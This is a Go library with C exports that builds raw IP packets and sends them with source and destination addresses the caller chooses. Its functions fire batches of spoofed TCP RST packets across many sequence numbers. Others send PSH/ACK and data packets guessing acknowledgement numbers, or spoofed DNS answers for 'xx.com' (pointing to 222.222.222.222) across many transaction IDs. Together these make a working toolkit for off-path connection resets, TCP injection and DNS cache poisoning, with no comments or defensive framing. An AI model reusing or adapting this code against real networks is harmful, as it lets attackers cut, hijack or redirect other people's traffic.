package main

import (
	"log"
	"net"

	"reflect"
	"sync"
	"syscall"
	"unsafe"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

import "C"

/*
#include<stdlib.h>
*/

var p_src_ip net.IP
var p_dst_ip net.IP
var ip4 layers.IPv4

func send_rawtcp(wg *sync.WaitGroup, l ...gopacket.SerializableLayer) {

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	buf := gopacket.NewSerializeBuffer()

	err := gopacket.SerializeLayers(buf, opts, l...)
	if err != nil {
		log.Fatal("SerializeLayers Fail:", err)
		(*wg).Done()
		return
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal("CreateSocket Fail:", err)
		(*wg).Done()
		return
	}

	defer syscall.Close(fd)
	ip := p_dst_ip.To4()
	pp := [4]byte{ip[0], ip[1], ip[2], ip[3]}
	addr := syscall.SockaddrInet4{
		Port: 0,
		Addr: pp, //[4]byte{192, 168, 9, 132},
	}
	err = syscall.Sendto(fd, buf.Bytes(), 0, &addr)
	if err != nil {
		log.Println("Sendto Fail:", err)
		(*wg).Done()
		return
	}

	(*wg).Done()
}

//export inits
func inits(src_ip, dst_ip *C.char, types int) int {

	src_str := C.GoString(src_ip)
	dst_str := C.GoString(dst_ip)

	p_src_ip = net.ParseIP(src_str)
	p_dst_ip = net.ParseIP(dst_str)

	if types == 0 {
		ip4 = layers.IPv4{
			SrcIP:    p_src_ip,
			DstIP:    p_dst_ip,
			Version:  4,
			TTL:      64,
			Protocol: layers.IPProtocolUDP,
			Flags:    layers.IPv4DontFragment,
		}
	} else {
		ip4 = layers.IPv4{
			SrcIP:    p_src_ip,
			DstIP:    p_dst_ip,
			Version:  4,
			TTL:      64,
			Protocol: layers.IPProtocolTCP,
			Flags:    layers.IPv4DontFragment,
		}
	}

	return 0
}

//export parallel_tcp_data
func parallel_tcp_data(s_port uint32, d_ports *uint32, count int32, seq_num uint32, ack_num uint32, lengths *uint32) int {
	var wg sync.WaitGroup
	var tcps []layers.TCP
	var src_port layers.TCPPort
	var dst_port layers.TCPPort
	var length uint32
	var add_value [][]byte
	var tmp_value []byte
	src_port = layers.TCPPort(s_port)

	var slice []C.uint
	header := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	header.Cap = int(count)
	header.Len = int(count)
	header.Data = uintptr(unsafe.Pointer(d_ports))

	var slice2 []C.uint
	header2 := (*reflect.SliceHeader)(unsafe.Pointer(&slice2))
	header2.Cap = int(count)
	header2.Len = int(count)
	header2.Data = uintptr(unsafe.Pointer(lengths))

	tmp_value = append(tmp_value, byte('a'))
	for i := 0; i < 1460; i++ {
		add_value = append(add_value, tmp_value)
		tmp_value = append(tmp_value, byte('a'))
	}
	for i := 0; i < int(count); i++ {
		dst_port = layers.TCPPort(slice[i])
		length = uint32(slice2[i])
		tcps = append(tcps, layers.TCP{
			SrcPort: src_port,
			DstPort: dst_port,
			Seq:     seq_num,
			Ack:     ack_num,
			ACK:     true,
		})
		tcps[i].SetNetworkLayerForChecksum(&ip4)
		wg.Add(1)
		go send_rawtcp(&wg, &ip4, &tcps[i], gopacket.Payload(add_value[length]))
	}

	wg.Wait()
	return 0
}

//export parallel_rst
func parallel_rst(s_port uint32, d_port uint32, seq_nums *C.uint, count int32, ack_num uint32) int {
	var wg sync.WaitGroup
	var tcps []layers.TCP

	dst_port := layers.TCPPort(d_port)
	src_port := layers.TCPPort(s_port)
	var slice []C.uint
	header := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	header.Cap = int(count)
	header.Len = int(count)
	header.Data = uintptr(unsafe.Pointer(seq_nums))
	for i := 0; i < int(count); i++ {
		seq_num := slice[i]
		tcps = append(tcps, layers.TCP{
			SrcPort: src_port,
			DstPort: dst_port,
			Seq:     uint32(seq_num),
			Ack:     uint32(ack_num),
			RST:     true,
		})
		tcps[i].SetNetworkLayerForChecksum(&ip4)
		wg.Add(1)
		go send_rawtcp(&wg, &ip4, &tcps[i])
	}

	wg.Wait()
	return 0
}

//export parallel_psh_ack
func parallel_psh_ack(s_port uint32, d_port uint32, seq_num uint32, ack_nums *C.uint, ack_count int32) int {
	var wg sync.WaitGroup
	var tcps []layers.TCP

	dst_port := layers.TCPPort(d_port)
	src_port := layers.TCPPort(s_port)
	var payload []byte
	var slice []C.uint
	header := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	header.Cap = int(ack_count)
	header.Len = int(ack_count)
	header.Data = uintptr(unsafe.Pointer(ack_nums))
	payload = append(payload, byte('a'))
	for i := 0; i < int(ack_count); i++ {
		ack_num := slice[i]

		tcps = append(tcps, layers.TCP{
			SrcPort: src_port,
			DstPort: dst_port,
			Seq:     uint32(seq_num),
			Ack:     uint32(ack_num),
			PSH:     true,
			ACK:     true,
		})
		tcps[i].SetNetworkLayerForChecksum(&ip4)

		wg.Add(1)
		go send_rawtcp(&wg, &ip4, &tcps[i], gopacket.Payload(payload))
	}

	wg.Wait()
	return 0
}

//export parallel_ack_data
func parallel_ack_data(s_port uint32, d_port uint32, seq_num uint32, ack_num uint32, data *C.char, count int32) int {
	var wg sync.WaitGroup
	var tcp layers.TCP

	dst_port := layers.TCPPort(d_port)
	src_port := layers.TCPPort(s_port)

	tcp = layers.TCP{
		SrcPort: src_port,
		DstPort: dst_port,
		Seq:     uint32(seq_num),
		Ack:     uint32(ack_num),
		PSH:     true,
		ACK:     true,
	}

	raw_bytes := C.GoBytes(unsafe.Pointer(data), C.int(count))

	tcp.SetNetworkLayerForChecksum(&ip4)
	wg.Add(1)
	go send_rawtcp(&wg, &ip4, &tcp, gopacket.Payload(raw_bytes))

	wg.Wait()
	return 0
}

//export parallel_udp_data
func parallel_udp_data(s_port uint32, d_ports *uint32, count int32, lengths *uint32) int {
	var wg sync.WaitGroup
	var udps []layers.UDP
	var src_port layers.UDPPort
	var dst_port layers.UDPPort
	var add_value [][]byte
	var tmp_value []byte
	var length uint32
	src_port = layers.UDPPort(s_port)

	var slice []C.uint
	header := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	header.Cap = int(count)
	header.Len = int(count)
	header.Data = uintptr(unsafe.Pointer(d_ports))

	var slice2 []C.uint
	header2 := (*reflect.SliceHeader)(unsafe.Pointer(&slice2))
	header2.Cap = int(count)
	header2.Len = int(count)
	header2.Data = uintptr(unsafe.Pointer(lengths))

	tmp_value = append(tmp_value, byte('a'))
	for i := 0; i < 1460; i++ {
		add_value = append(add_value, tmp_value)
		tmp_value = append(tmp_value, byte('a'))
	}
	for i := 0; i < int(count); i++ {
		dst_port = layers.UDPPort(slice[i])
		length = uint32(slice2[i])
		udps = append(udps, layers.UDP{
			SrcPort: src_port,
			DstPort: dst_port,
		})
		udps[i].SetNetworkLayerForChecksum(&ip4)

		wg.Add(1)
		go send_rawtcp(&wg, &ip4, &udps[i], gopacket.Payload(add_value[length]))
	}

	wg.Wait()
	return 0
}

//export parallel_dns_response
func parallel_dns_response(s_port uint32, d_port uint32, trid *uint32, count int32) int {
	var wg sync.WaitGroup
	var udp layers.UDP
	var dnss []layers.DNS
	var src_port layers.UDPPort
	var dst_port layers.UDPPort
	var dns_questions []layers.DNSQuestion
	var dns_answers []layers.DNSResourceRecord

	src_port = layers.UDPPort(s_port)
	dst_port = layers.UDPPort(d_port)

	var slice []C.uint
	header := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	header.Cap = int(count)
	header.Len = int(count)
	header.Data = uintptr(unsafe.Pointer(trid))

	udp = layers.UDP{
		SrcPort: src_port,
		DstPort: dst_port,
	}
	udp.SetNetworkLayerForChecksum(&ip4)

	dns_questions = append(dns_questions, layers.DNSQuestion{
		Name:  []byte{0x78, 0x78, 0x2e, 0x63, 0x6f, 0x6d}, // xx.com
		Type:  layers.DNSType(1),
		Class: layers.DNSClass(1),
	})

	dns_answers = append(dns_answers, layers.DNSResourceRecord{
		Name:       []byte{0x78, 0x78, 0x2e, 0x63, 0x6f, 0x6d},
		Type:       layers.DNSType(1),
		Class:      layers.DNSClass(1),
		TTL:        uint32(0x2a2f),
		DataLength: 4,
		IP:         net.ParseIP("222.222.222.222"),
	})

	for i := 0; i < int(count); i++ {

		dnss = append(dnss, layers.DNS{
			ID:           uint16(slice[i]),
			QR:           true,
			OpCode:       layers.DNSOpCode(0),
			AA:           false,
			TC:           false,
			RD:           true,
			RA:           true,
			Z:            uint8(0),
			ResponseCode: layers.DNSResponseCode(0),
			QDCount:      uint16(1),
			ANCount:      uint16(1),
			NSCount:      uint16(0),
			ARCount:      uint16(0),

			Questions: dns_questions,
			Answers:   dns_answers,
		})
		wg.Add(1)

		go send_rawtcp(&wg, &ip4, &udp, &dnss[i])
	}

	wg.Wait()
	return 0
}

func main() {
	log.Println("hello world")
}
